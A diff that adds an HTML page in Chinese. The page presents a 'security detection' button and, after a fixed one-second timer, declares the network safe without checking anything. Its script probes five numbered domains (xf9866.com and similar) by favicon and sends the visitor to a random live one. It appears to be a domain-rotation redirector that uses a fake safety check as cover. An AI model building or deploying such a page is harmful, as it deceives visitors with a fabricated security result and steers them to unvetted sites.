@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Security</title>
+    </head>
+    <link rel="stylesheet" href="css/style.css" />
+
+    <body>
+        <div class="wrapper">
+            <div class="top">
+                <img class="image" src="images/check.png" alt="" />
+                <div class="loaderText">
+                    <div class="text">点击进行安全检测</div>
+                </div>
+            </div>
+            <div class="bottom">
+                <button id="btn" onclick="handleDetect()">开始检测</button>
+                <div class="notice">安全软件提供技术支持</div>
+                <!-- <div class="notice">
+                    copyright ©2023 Website Detection All Rights Reserved
+                </div> -->
+            </div>
+        </div>
+    </body>
+    <script>
+        const handleDetect = () => {
+            document.getElementById("btn").disabled = true;
+            document.getElementsByClassName("loaderText")[0].innerHTML =
+                '<div class="text">进行安全检测中</div><div class="loader"></div>';
+            toOk();
+        };
+
+        let toOk = function () {
+            setTimeout(function () {
+                document.getElementsByClassName("loaderText")[0].innerHTML =
+                    '<div class="text">安全检测完成，网络状况良好</div>';
+                toLink();
+            }, 1000);
+        };
+
+        var successfulUrls = [];
+        let urls = [
+            "xf9866.com",
+            "xf9698.com",
+            "xf8799.com",
+            "xf8578.com",
+            "xf6877.com",
+        ];
+        let urlsWithFavicon = [];
+
+        function placeFavicon(urls) {
+            for (const url of urls) {
+                urlsWithFavicon.push("https://" + url + "/favicon.ico");
+            }
+        }
+
+        function testURLs(urls) {
+            for (const url of urls) {
+                const img = new Image();
+                img.onload = function () {
+                    console.log(`Successful URL: ${url}`);
+                    successfulUrls.push(url.replace("/favicon.ico", ""));
+                };
+                img.onerror = () => console.log(`Failed URL: ${url}`);
+                img.src = url;
+            }
+        }
+
+        placeFavicon(urls);
+        testURLs(urlsWithFavicon);
+
+        let toLink = function () {
+            console.log(urls);
+                console.log(successfulUrls);
+            setTimeout(function () {
+                
+
+                for (const url of urls) {
+                    const img = new Image();
+                    img.onload = () =>
+                        successfulUrls.push(url.replace("/favicon.ico", ""));
+                    img.onerror = () => console.log(`Failed URL: ${url}`);
+                    img.src = url;
+                }
+
+                if (successfulUrls.length > 0) {
+                    let randomIndex = Math.floor(
+                        Math.random() * successfulUrls.length
+                    );
+                    let domain = successfulUrls[randomIndex];
+
+                    referer = document.referrer
+                        .replace(/^http:?\/\//i, "")
+                        .replace("/", "");
+
+                    if (domain !== "") {
+                        window.location.href = domain;
+                    }
+                } else {
+                    console.log("No successful URLs");
+                }
+            }, 1000);
+        };
+    </script>
+</html>
